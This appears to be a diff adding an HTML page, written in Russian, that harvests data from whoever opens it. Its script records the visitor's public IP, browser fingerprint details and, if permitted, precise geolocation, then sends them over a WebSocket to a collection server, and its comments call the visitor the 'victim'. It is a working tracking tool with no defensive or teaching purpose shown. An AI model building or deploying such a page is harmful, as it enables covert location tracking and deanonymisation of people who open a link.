@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сбор данных</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+    </style>
+</head>
+<body>
+    <h1>Пожалуйста, разрешите доступ к вашей информации</h1>
+    <script>
+        const ws = new WebSocket('ws://localhost:3000');
+
+        // Получение IP-адреса жертвы
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const victimData = {
+                    ip: data.ip,
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    plugins: Array.from(navigator.plugins).map(plugin => plugin.name),
+                    os: navigator.appVersion,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    battery: navigator.getBattery ? navigator.getBattery().then(battery => battery.level) : null,
+                    connection: navigator.connection ? navigator.connection.effectiveType : null,
+                    memory: performance.memory ? performance.memory.jsHeapSizeLimit : null
+                };
+
+                // Получение точного местоположения через HTML5 Geolocation API
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        victimData.latitude = position.coords.latitude;
+                        victimData.longitude = position.coords.longitude;
+                        ws.send(JSON.stringify(victimData));
+                    }, error => {
+                        console.error('Ошибка получения местоположения: ', error);
+                        ws.send(JSON.stringify(victimData));
+                    });
+                } else {
+                    ws.send(JSON.stringify(victimData));
+                }
+            })
+            .catch(err => {
+                console.error('Ошибка получения IP-адреса: ', err);
+            });
+    </script>
+</body>
+</html>
